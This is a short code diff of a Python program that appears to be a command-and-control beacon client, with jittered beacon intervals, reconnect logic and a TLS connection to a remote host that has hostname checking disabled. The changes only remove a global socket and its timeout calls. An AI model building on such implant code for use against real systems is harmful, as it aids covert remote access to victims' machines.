@@ -38,7 +38,6 @@ BEACON_INTERVAL_HDD = None
 BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
 CURRENT_WORKING_DIR = getcwd()
 RECONNECT_ATTEMPTS = 5 #immediately upon disconnect
-s = socket(AF_INET, SOCK_STREAM)
 
 try:
     if name  == "nt":
@@ -323,9 +322,7 @@ def callback_port(conn,data):
                 print(e)
 
 def connect(remote_ip=remote_ip, remote_port=remote_port):
-    global s
 
-    s.settimeout(0)
     data = ""
     context = create_default_context(Purpose.SERVER_AUTH, cafile='server_cert')
     context.check_hostname = False
@@ -502,7 +499,6 @@ def beacon_drift(value=30):
 def main():
     global BEACON_INTERVAL_SETTING
     global RECONNECT_ATTEMPTS
-    global s
     global remote_port
     global remote_ip
     parser = argparse.ArgumentParser(description="")
@@ -548,7 +544,6 @@ def main():
             drift = beacon_drift(BEACON_INTERVAL_SETTING)
             
             try:
-                s.settimeout(7)
                 if RECONNECT_ATTEMPTS != 0:
                     RECONNECT_ATTEMPTS = RECONNECT_ATTEMPTS - 1
                     if VERBOSE:
